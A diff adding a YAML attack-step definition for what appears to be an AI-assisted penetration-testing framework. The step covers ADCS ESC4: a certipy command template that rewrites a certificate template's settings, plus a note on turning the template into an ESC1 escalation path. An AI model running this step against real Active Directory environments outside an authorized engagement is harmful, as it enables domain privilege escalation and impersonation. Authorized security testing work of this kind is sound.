@@ -1,0 +1,17 @@
+name: adcs_esc4
+category: ad
+description: ADCS ESC4 template ACL abuse
+preconditions:
+  - domain_joined
+  - has_cred
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: "certipy template -u '{username}@{domain}' -p '{password}' -template '{template}' -save-old -dc-ip {target_ip}"
+parser: null
+expected_effects:
+  - action_completed
+falsifier:
+  pattern: "error|failed|refused|denied"
+  timeout: 30
+model_tier: haiku
+mechanism: "ESC4: WriteDACL/Owner on template → modify template to ESC1 config (add CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT, set SAN). Then exploit as ESC1."
